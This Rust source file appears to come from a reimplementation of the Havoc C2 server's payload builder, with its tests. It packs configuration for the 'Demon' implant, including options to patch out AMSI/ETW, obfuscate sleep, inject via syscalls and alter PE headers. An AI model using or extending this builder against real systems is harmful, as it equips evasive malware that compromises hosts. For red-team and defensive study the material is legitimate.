fn injection_mode(config: &Map<String, Value>, key: &str) -> Result<u32, PayloadBuildError> {
    match required_string(config, key)? {
        "Win32" => Ok(1),
        "Native/Syscall" => Ok(2),
        _ => Ok(0),
    }
}

fn sleep_obfuscation_value(value: &str) -> u32 {
    match value {
        "Foliage" => 3,
        "Ekko" => 1,
        "Zilean" => 2,
        _ => 0,
    }
}

fn sleep_jump_bypass(obfuscation: u32, value: Option<&str>) -> Result<u32, PayloadBuildError> {
    if obfuscation == 0 {
        return Ok(0);
    }
    Ok(match value.unwrap_or_default() {
        "jmp rax" => 1,
        "jmp rbx" => 2,
        _ => 0,
    })
}

fn proxy_loading_value(value: Option<&str>) -> u32 {
    match value.unwrap_or("None (LdrLoadDll)") {
        "RtlRegisterWait" => 1,
        "RtlCreateTimer" => 2,
        "RtlQueueWorkItem" => 3,
        _ => 0,
    }
}

fn amsi_patch_value(value: Option<&str>) -> u32 {
    match value.unwrap_or_default() {
        "Hardware breakpoints" => 1,
        "Memory" => 2,
        _ => 0,
    }
}

fn parse_kill_date(value: Option<&str>) -> Result<u64, PayloadBuildError> {
    match value.map(str::trim).filter(|value| !value.is_empty()) {
        Some(value) => {
            let timestamp =
                value.parse::<i64>().map_err(|_| PayloadBuildError::InvalidRequest {
                    message: format!("KillDate `{value}` must be a unix timestamp"),
                })?;
            u64::try_from(timestamp).map_err(|_| PayloadBuildError::InvalidRequest {
                message: format!("KillDate `{value}` must be a non-negative unix timestamp"),
            })
        }
        None => Ok(0),
    }
}

fn parse_working_hours(value: Option<&str>) -> Result<i32, PayloadBuildError> {
    let Some(value) = value.map(str::trim).filter(|value| !value.is_empty()) else {
        return Ok(0);
    };

    let (start, end) = value.split_once('-').ok_or_else(|| PayloadBuildError::InvalidRequest {
        message: "WorkingHours must use `HH:MM-HH:MM`".to_owned(),
    })?;
    let (start_hour, start_minute) = parse_hour_minute(start)?;
    let (end_hour, end_minute) = parse_hour_minute(end)?;
    if end_hour < start_hour || (end_hour == start_hour && end_minute <= start_minute) {
        return Err(PayloadBuildError::InvalidRequest {
            message: "WorkingHours end must be after the start".to_owned(),
        });
    }

    let mut packed = 0_i32;
    packed |= 1 << 22;
    packed |= (i32::from(start_hour) & 0b01_1111) << 17;
    packed |= (i32::from(start_minute) & 0b11_1111) << 11;
    packed |= (i32::from(end_hour) & 0b01_1111) << 6;
    packed |= i32::from(end_minute) & 0b11_1111;
    Ok(packed)
}

fn parse_hour_minute(value: &str) -> Result<(u8, u8), PayloadBuildError> {
    let (hour, minute) =
        value.split_once(':').ok_or_else(|| PayloadBuildError::InvalidRequest {
            message: "WorkingHours must use `HH:MM-HH:MM`".to_owned(),
        })?;
    let hour = hour.trim().parse::<u8>().map_err(|_| PayloadBuildError::InvalidRequest {
        message: format!("invalid working-hours hour `{hour}`"),
    })?;
    let minute = minute.trim().parse::<u8>().map_err(|_| PayloadBuildError::InvalidRequest {
        message: format!("invalid working-hours minute `{minute}`"),
    })?;
    if hour > 23 || minute > 59 {
        return Err(PayloadBuildError::InvalidRequest {
            message: "WorkingHours contains an out-of-range hour or minute".to_owned(),
        });
    }
    Ok((hour, minute))
}

fn proxy_url(proxy: &HttpListenerProxyConfig) -> String {
    let scheme = proxy.proxy_type.as_deref().unwrap_or("http");
    format!("{scheme}://{}:{}", proxy.host, proxy.port)
}

fn add_u32(buffer: &mut Vec<u8>, value: u32) {
    buffer.extend_from_slice(&value.to_le_bytes());
}

fn add_u64(buffer: &mut Vec<u8>, value: u64) {
    buffer.extend_from_slice(&value.to_le_bytes());
}

fn add_bytes(buffer: &mut Vec<u8>, value: &[u8]) -> Result<(), PayloadBuildError> {
    let len = u32::try_from(value.len()).map_err(|_| PayloadBuildError::InvalidRequest {
        message: format!("byte slice length {} exceeds u32::MAX", value.len()),
    })?;
    add_u32(buffer, len);
    buffer.extend_from_slice(value);
    Ok(())
}

fn add_wstring(buffer: &mut Vec<u8>, value: &str) -> Result<(), PayloadBuildError> {
    let mut utf16: Vec<u8> = value.encode_utf16().flat_map(u16::to_le_bytes).collect();
    utf16.extend_from_slice(&[0, 0]);
    add_bytes(buffer, &utf16)
}

#[cfg(test)]
mod tests {
    use super::*;
    use red_cell_common::HttpListenerProxyConfig as DomainHttpListenerProxyConfig;
    use serde_json::json;

    #[test]
    fn merged_request_config_applies_profile_defaults() -> Result<(), Box<dyn std::error::Error>> {
        let config = merged_request_config(
            r#"{"Injection":{"Alloc":"Win32","Execute":"Win32"}}"#,
            &DemonConfig {
                sleep: Some(10),
                jitter: Some(25),
                indirect_syscall: true,
                stack_duplication: true,
                sleep_technique: Some("Ekko".to_owned()),
                proxy_loading: Some("RtlCreateTimer".to_owned()),
                amsi_etw_patching: Some("Hardware breakpoints".to_owned()),
                injection: Some(red_cell_common::config::ProcessInjectionConfig {
                    spawn64: Some("C:\\Windows\\System32\\notepad.exe".to_owned()),
                    spawn32: Some("C:\\Windows\\SysWOW64\\notepad.exe".to_owned()),
                }),
                dotnet_name_pipe: Some(r"\\.\pipe\red-cell-dotnet".to_owned()),
                binary: None,
                trust_x_forwarded_for: false,
                trusted_proxy_peers: Vec::new(),
            },
        )?;

        assert_eq!(config.get("Sleep"), Some(&Value::String("10".to_owned())));
        assert_eq!(config.get("Jitter"), Some(&Value::String("25".to_owned())));
        assert_eq!(config.get("Indirect Syscall"), Some(&Value::Bool(true)));
        assert_eq!(config.get("Stack Duplication"), Some(&Value::Bool(true)));
        assert_eq!(config.get("Sleep Technique"), Some(&Value::String("Ekko".to_owned())));
        assert_eq!(config.get("DotNetNamePipe"), None);
        assert_eq!(
            config["Injection"]["Spawn64"],
            Value::String("C:\\Windows\\System32\\notepad.exe".to_owned())
        );
        assert_eq!(
            config["Injection"]["Spawn32"],
            Value::String("C:\\Windows\\SysWOW64\\notepad.exe".to_owned())
        );
        Ok(())
    }

    #[test]
    fn pack_config_matches_expected_http_layout() -> Result<(), Box<dyn std::error::Error>> {
        let config = serde_json::from_value::<Map<String, Value>>(json!({
            "Sleep": "5",
            "Jitter": "15",
            "Indirect Syscall": true,
            "Stack Duplication": true,
            "Sleep Technique": "Ekko",
            "Sleep Jmp Gadget": "jmp rbx",
            "Proxy Loading": "RtlCreateTimer",
            "Amsi/Etw Patch": "Hardware breakpoints",
            "Injection": {
                "Alloc": "Win32",
                "Execute": "Native/Syscall",
                "Spawn64": "C:\\Windows\\System32\\notepad.exe",
                "Spawn32": "C:\\Windows\\SysWOW64\\notepad.exe"
            }
        }))?;
        let listener = ListenerConfig::Http(Box::new(HttpListenerConfig {
            name: "http".to_owned(),
            kill_date: Some("1234".to_owned()),
            working_hours: Some("08:00-17:00".to_owned()),
            hosts: vec!["listener.local".to_owned()],
            host_bind: "0.0.0.0".to_owned(),
            host_rotation: "round-robin".to_owned(),
            port_bind: 8443,
            port_conn: Some(443),
            method: None,
            behind_redirector: false,
            trusted_proxy_peers: Vec::new(),
            user_agent: Some("Mozilla".to_owned()),
            headers: vec!["Header: One".to_owned()],
            uris: vec!["/beacon".to_owned()],
            host_header: Some("front.local".to_owned()),
            secure: true,
            cert: None,
            response: None,
            proxy: Some(DomainHttpListenerProxyConfig {
                enabled: true,
                proxy_type: Some("http".to_owned()),
                host: "proxy.local".to_owned(),
                port: 8080,
                username: Some("neo".to_owned()),
                password: Some("trinity".to_owned()),
            }),
        }));

        let bytes = pack_config(&listener, &config)?;
        let mut cursor = bytes.as_slice();
        assert_eq!(read_u32(&mut cursor)?, 5);
        assert_eq!(read_u32(&mut cursor)?, 15);
        assert_eq!(read_u32(&mut cursor)?, 1);
        assert_eq!(read_u32(&mut cursor)?, 2);
        assert_eq!(read_wstring(&mut cursor)?, "C:\\Windows\\System32\\notepad.exe");
        assert_eq!(read_wstring(&mut cursor)?, "C:\\Windows\\SysWOW64\\notepad.exe");
        assert_eq!(read_u32(&mut cursor)?, 1);
        assert_eq!(read_u32(&mut cursor)?, 2);
        assert_eq!(read_u32(&mut cursor)?, 1);
        assert_eq!(read_u32(&mut cursor)?, 2);
        assert_eq!(read_u32(&mut cursor)?, 1);
        assert_eq!(read_u32(&mut cursor)?, 1);
        assert_eq!(read_u64(&mut cursor)?, 1234);
        assert_eq!(read_u32(&mut cursor)?, 5_243_968);
        assert_eq!(read_wstring(&mut cursor)?, "POST");
        assert_eq!(read_u32(&mut cursor)?, 0);
        assert_eq!(read_u32(&mut cursor)?, 1);
        assert_eq!(read_wstring(&mut cursor)?, "listener.local");
        assert_eq!(read_u32(&mut cursor)?, 443);
        assert_eq!(read_u32(&mut cursor)?, 1);
        assert_eq!(read_wstring(&mut cursor)?, "Mozilla");
        assert_eq!(read_u32(&mut cursor)?, 2);
        assert_eq!(read_wstring(&mut cursor)?, "Header: One");
        assert_eq!(read_wstring(&mut cursor)?, "Host: front.local");
        assert_eq!(read_u32(&mut cursor)?, 1);
        assert_eq!(read_wstring(&mut cursor)?, "/beacon");
        assert_eq!(read_u32(&mut cursor)?, 1);
        assert_eq!(read_wstring(&mut cursor)?, "http://proxy.local:8080");
        assert_eq!(read_wstring(&mut cursor)?, "neo");
        assert_eq!(read_wstring(&mut cursor)?, "trinity");
        assert!(cursor.is_empty());
        Ok(())
    }

    #[test]
    fn pack_config_ends_after_listener_specific_fields() -> Result<(), Box<dyn std::error::Error>> {
        let config = serde_json::from_value::<Map<String, Value>>(json!({
            "Sleep": "5",
            "Jitter": "0",
            "Sleep Technique": "WaitForSingleObjectEx",
            "Injection": {
                "Alloc": "Win32",
                "Execute": "Win32",
                "Spawn64": "a",
                "Spawn32": "b"
            }
        }))?;
        let listener = ListenerConfig::Smb(red_cell_common::SmbListenerConfig {
            name: "smb".to_owned(),
            pipe_name: "pivot".to_owned(),
            kill_date: None,
            working_hours: None,
        });

        let bytes = pack_config(&listener, &config)?;
        let mut cursor = bytes.as_slice();
        assert_eq!(read_u32(&mut cursor)?, 5);
        assert_eq!(read_u32(&mut cursor)?, 0);
        assert_eq!(read_u32(&mut cursor)?, 1);
        assert_eq!(read_u32(&mut cursor)?, 1);
        assert_eq!(read_wstring(&mut cursor)?, "a");
        assert_eq!(read_wstring(&mut cursor)?, "b");
        assert_eq!(read_u32(&mut cursor)?, 0);
        assert_eq!(read_u32(&mut cursor)?, 0);
        assert_eq!(read_u32(&mut cursor)?, 0);
        assert_eq!(read_u32(&mut cursor)?, 0);
        assert_eq!(read_u32(&mut cursor)?, 0);
        assert_eq!(read_u32(&mut cursor)?, 0);
        assert_eq!(read_wstring(&mut cursor)?, r"\\.\pipe\pivot");
        assert_eq!(read_u64(&mut cursor)?, 0);
        assert_eq!(read_u32(&mut cursor)?, 0);
        assert!(cursor.is_empty());
        Ok(())
    }

    #[test]
    fn parse_working_hours_encodes_expected_bitmask() -> Result<(), Box<dyn std::error::Error>> {
        assert_eq!(parse_working_hours(Some("08:00-17:00"))?, 5_243_968);
        Ok(())
    }

    #[test]
    fn parse_kill_date_accepts_positive_timestamp() -> Result<(), Box<dyn std::error::Error>> {
        assert_eq!(parse_kill_date(Some("1234"))?, 1234);
        Ok(())
    }

    #[test]
    fn parse_kill_date_rejects_negative_timestamp() {
        let err = parse_kill_date(Some("-1"));
        assert!(matches!(
            err,
            Err(PayloadBuildError::InvalidRequest { message })
                if message == "KillDate `-1` must be a non-negative unix timestamp"
        ));
    }

    #[test]
    fn parse_hour_minute_accepts_max_valid_time() -> Result<(), Box<dyn std::error::Error>> {
        let (h, m) = parse_hour_minute("23:59")?;
        assert_eq!(h, 23);
        assert_eq!(m, 59);
        Ok(())
    }

    #[test]
    fn parse_hour_minute_rejects_hour_24() {
        let err = parse_hour_minute("24:00");
        assert!(matches!(err, Err(PayloadBuildError::InvalidRequest { .. })));
    }

    #[test]
    fn parse_hour_minute_rejects_minute_60() {
        let err = parse_hour_minute("00:60");
        assert!(matches!(err, Err(PayloadBuildError::InvalidRequest { .. })));
    }

    #[test]
    fn parse_hour_minute_rejects_24_60() {
        let err = parse_hour_minute("24:60");
        assert!(matches!(err, Err(PayloadBuildError::InvalidRequest { .. })));
    }

    #[test]
    fn add_bytes_writes_length_prefixed_data() -> Result<(), PayloadBuildError> {
        let mut buf = Vec::new();
        add_bytes(&mut buf, b"hello")?;
        assert_eq!(&buf[..4], &5_u32.to_le_bytes());
        assert_eq!(&buf[4..], b"hello");
        Ok(())
    }

    #[test]
    fn add_bytes_returns_error_for_empty_after_wstring() -> Result<(), PayloadBuildError> {
        let mut buf = Vec::new();
        add_wstring(&mut buf, "")?;
        assert_eq!(&buf[..4], &2_u32.to_le_bytes(), "empty string still has null terminator");
        Ok(())
    }

    fn read_u32(cursor: &mut &[u8]) -> Result<u32, PayloadBuildError> {
        let bytes = take(cursor, 4)?;
        let array: [u8; 4] = bytes.try_into().map_err(|_| PayloadBuildError::InvalidRequest {
            message: "test parser failed to decode u32".to_owned(),
        })?;
        Ok(u32::from_le_bytes(array))
    }

    fn read_u64(cursor: &mut &[u8]) -> Result<u64, PayloadBuildError> {
        let bytes = take(cursor, 8)?;
        let array: [u8; 8] = bytes.try_into().map_err(|_| PayloadBuildError::InvalidRequest {
            message: "test parser failed to decode u64".to_owned(),
        })?;
        Ok(u64::from_le_bytes(array))
    }

    fn read_wstring(cursor: &mut &[u8]) -> Result<String, PayloadBuildError> {
        let byte_len =
            usize::try_from(read_u32(cursor)?).map_err(|_| PayloadBuildError::InvalidRequest {
                message: "test parser string length overflow".to_owned(),
            })?;
        let bytes = take(cursor, byte_len)?;
        if bytes.len() < 2 || bytes[bytes.len() - 2..] != [0, 0] {
            return Err(PayloadBuildError::InvalidRequest {
                message: "test parser missing UTF-16 terminator".to_owned(),
            });
        }

        let units = bytes[..bytes.len() - 2]
            .chunks_exact(2)
            .map(|chunk| u16::from_le_bytes([chunk[0], chunk[1]]))
            .collect::<Vec<_>>();
        String::from_utf16(&units).map_err(|error| PayloadBuildError::InvalidRequest {
            message: format!("test parser invalid UTF-16: {error}"),
        })
    }

    fn take<'a>(cursor: &mut &'a [u8], len: usize) -> Result<&'a [u8], PayloadBuildError> {
        if cursor.len() < len {
            return Err(PayloadBuildError::InvalidRequest {
                message: "test parser reached end of buffer".to_owned(),
            });
        }
        let (head, tail) = cursor.split_at(len);
        *cursor = tail;
        Ok(head)
    }

    #[test]
    fn parse_hour_minute_accepts_zero() -> Result<(), Box<dyn std::error::Error>> {
        let (h, m) = parse_hour_minute("00:00")?;
        assert_eq!(h, 0);
        assert_eq!(m, 0);
        Ok(())
    }

    #[tokio::test]
    async fn build_payload_rejects_unsupported_listener_protocol()
    -> Result<(), Box<dyn std::error::Error>> {
        let service = PayloadBuilderService::disabled_for_tests();
        let request = BuildPayloadRequestInfo {
            agent_type: "Demon".to_owned(),
            listener: "dns".to_owned(),
            arch: "x64".to_owned(),
            format: "Windows Exe".to_owned(),
            config: r#"{"Sleep":"5","Jitter":"0","Sleep Technique":"WaitForSingleObjectEx","Injection":{"Alloc":"Win32","Execute":"Win32","Spawn64":"a","Spawn32":"b"}}"#.to_owned(),
        };
        let listener = ListenerConfig::Dns(red_cell_common::DnsListenerConfig {
            name: "dns".to_owned(),
            host_bind: "0.0.0.0".to_owned(),
            port_bind: 53,
            domain: "c2.local".to_owned(),
            record_types: vec!["TXT".to_owned()],
            kill_date: None,
            working_hours: None,
        });

        let error = service
            .build_payload(&listener, &request, |_| {})
            .await
            .expect_err("invalid request should be rejected");
        assert!(matches!(error, PayloadBuildError::InvalidRequest { .. }));
        Ok(())
    }

    #[tokio::test]
    async fn build_payload_uses_toolchain_and_returns_compiled_bytes()
    -> Result<(), Box<dyn std::error::Error>> {
        let temp = TempDir::new()?;
        let bin_dir = temp.path().join("bin");
        let source_root = temp.path().join("src/Havoc/payloads/Demon");
        let shellcode_root = temp.path().join("src/Havoc/payloads");
        std::fs::create_dir_all(&bin_dir)?;
        std::fs::create_dir_all(source_root.join("src/core"))?;
        std::fs::create_dir_all(source_root.join("src/crypt"))?;
        std::fs::create_dir_all(source_root.join("src/inject"))?;
        std::fs::create_dir_all(source_root.join("src/asm"))?;
        std::fs::create_dir_all(source_root.join("src/main"))?;
        std::fs::create_dir_all(source_root.join("include"))?;
        std::fs::create_dir_all(&shellcode_root)?;
        std::fs::write(source_root.join("src/core/a.c"), "int x = 1;")?;
        std::fs::write(source_root.join("src/asm/test.x64.asm"), "bits 64")?;
        std::fs::write(source_root.join("src/main/MainExe.c"), "int main(void){return 0;}")?;
        std::fs::write(source_root.join("src/main/MainSvc.c"), "int main(void){return 0;}")?;
        std::fs::write(source_root.join("src/main/MainDll.c"), "int main(void){return 0;}")?;
        std::fs::write(source_root.join("src/Demon.c"), "int demo = 1;")?;
        std::fs::write(shellcode_root.join("Shellcode.x64.bin"), [0x90, 0x90])?;
        std::fs::write(shellcode_root.join("Shellcode.x86.bin"), [0x90, 0x90])?;

        let nasm = bin_dir.join("nasm");
        let gcc = bin_dir.join("x86_64-w64-mingw32-gcc");
        std::fs::write(
            &nasm,
            "#!/bin/sh\nwhile [ $# -gt 0 ]; do if [ \"$1\" = \"-o\" ]; then shift; printf 'asm' > \"$1\"; break; fi; shift; done\necho nasm-ok\n",
        )?;
        std::fs::write(
            &gcc,
            "#!/bin/sh\nwhile [ $# -gt 0 ]; do if [ \"$1\" = \"-o\" ]; then shift; printf 'payload' > \"$1\"; break; fi; shift; done\necho gcc-ok\n",
        )?;
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            std::fs::set_permissions(&nasm, std::fs::Permissions::from_mode(0o755))?;
            std::fs::set_permissions(&gcc, std::fs::Permissions::from_mode(0o755))?;
        }

        let service = PayloadBuilderService::with_paths_for_tests(
            Toolchain { compiler_x64: gcc.clone(), compiler_x86: gcc, nasm },
            source_root,
            shellcode_root.join("Shellcode.x64.bin"),
            shellcode_root.join("Shellcode.x86.bin"),
            DemonConfig {
                sleep: None,
                jitter: None,
                indirect_syscall: false,
                stack_duplication: false,
                sleep_technique: None,
                proxy_loading: None,
                amsi_etw_patching: None,
                injection: None,
                dotnet_name_pipe: None,
                binary: None,
                trust_x_forwarded_for: false,
                trusted_proxy_peers: Vec::new(),
            },
            None,
        );
        let request = BuildPayloadRequestInfo {
            agent_type: "Demon".to_owned(),
            listener: "http".to_owned(),
            arch: "x64".to_owned(),
            format: "Windows Exe".to_owned(),
            config: r#"{"Sleep":"5","Jitter":"0","Sleep Technique":"WaitForSingleObjectEx","Injection":{"Alloc":"Win32","Execute":"Win32","Spawn64":"a","Spawn32":"b"}}"#.to_owned(),
        };
        let listener = ListenerConfig::Http(Box::new(HttpListenerConfig {
            name: "http".to_owned(),
            kill_date: None,
            working_hours: None,
            hosts: vec!["listener.local".to_owned()],
            host_bind: "0.0.0.0".to_owned(),
            host_rotation: "round-robin".to_owned(),
            port_bind: 443,
            port_conn: Some(443),
            method: None,
            behind_redirector: false,
            trusted_proxy_peers: Vec::new(),
            user_agent: None,
            headers: Vec::new(),
            uris: Vec::new(),
            host_header: None,
            secure: false,
            cert: None,
            response: None,
            proxy: None,
        }));

        let mut messages = Vec::new();
        let artifact = service
            .build_payload(&listener, &request, |message| messages.push(message.message))
            .await?;
        assert_eq!(artifact.bytes, b"payload");
        assert_eq!(artifact.file_name, "demon.x64.exe");
        assert!(messages.iter().any(|line| line.contains("nasm-ok")));
        assert!(messages.iter().any(|line| line.contains("gcc-ok")));
        Ok(())
    }

    #[test]
    fn patch_payload_updates_pe_header_fields() -> Result<(), Box<dyn std::error::Error>> {
        let patched = patch_payload(
            sample_pe_payload(),
            Architecture::X64,
            &BinaryConfig {
                header: Some(red_cell_common::config::HeaderConfig {
                    magic_mz_x64: Some("MZ".to_owned()),
                    magic_mz_x86: None,
                    compile_time: Some("0x12345678".to_owned()),
                    image_size_x64: Some(0x2000),
                    image_size_x86: None,
                }),
                replace_strings_x64: std::collections::BTreeMap::new(),
                replace_strings_x86: std::collections::BTreeMap::new(),
            },
        )?;

        let pe_offset = 0x80;
        assert_eq!(&patched[..2], b"MZ");
        assert_eq!(
            u32::from_le_bytes(patched[pe_offset + 8..pe_offset + 12].try_into()?),
            0x1234_5678
        );
        let optional_header_offset = pe_offset + 24;
        assert_eq!(
            u32::from_le_bytes(
                patched[optional_header_offset + 56..optional_header_offset + 60].try_into()?
            ),
            0x2000
        );
        Ok(())
    }

    #[test]
    fn patch_payload_rejects_invalid_compile_time() {
        let error = patch_payload(
            sample_pe_payload(),
            Architecture::X64,
            &BinaryConfig {
                header: Some(red_cell_common::config::HeaderConfig {
                    magic_mz_x64: None,
                    magic_mz_x86: None,
                    compile_time: Some("not-a-number".to_owned()),
                    image_size_x64: None,
                    image_size_x86: None,
                }),
                replace_strings_x64: std::collections::BTreeMap::new(),
                replace_strings_x86: std::collections::BTreeMap::new(),
            },
        )
        .expect_err("invalid compile time should fail");

        assert!(matches!(error, PayloadBuildError::InvalidRequest { .. }));
    }

    #[test]
    fn patch_payload_rejects_truncated_pe_header() {
        let error = patch_payload(
            vec![0_u8; 8],
            Architecture::X64,
            &BinaryConfig {
                header: Some(red_cell_common::config::HeaderConfig {
                    magic_mz_x64: None,
                    magic_mz_x86: None,
                    compile_time: Some("1".to_owned()),
                    image_size_x64: None,
                    image_size_x86: None,
                }),
                replace_strings_x64: std::collections::BTreeMap::new(),
                replace_strings_x86: std::collections::BTreeMap::new(),
            },
        )
        .expect_err("truncated pe should fail");

        assert!(matches!(error, PayloadBuildError::InvalidRequest { .. }));
    }

    fn sample_pe_payload() -> Vec<u8> {
        let mut bytes = vec![0_u8; 0x80 + 24 + 60];
        bytes[..2].copy_from_slice(b"MZ");
        bytes[0x3C..0x40].copy_from_slice(&(0x80_u32).to_le_bytes());
        bytes[0x80..0x84].copy_from_slice(b"PE\0\0");
        bytes
    }
}
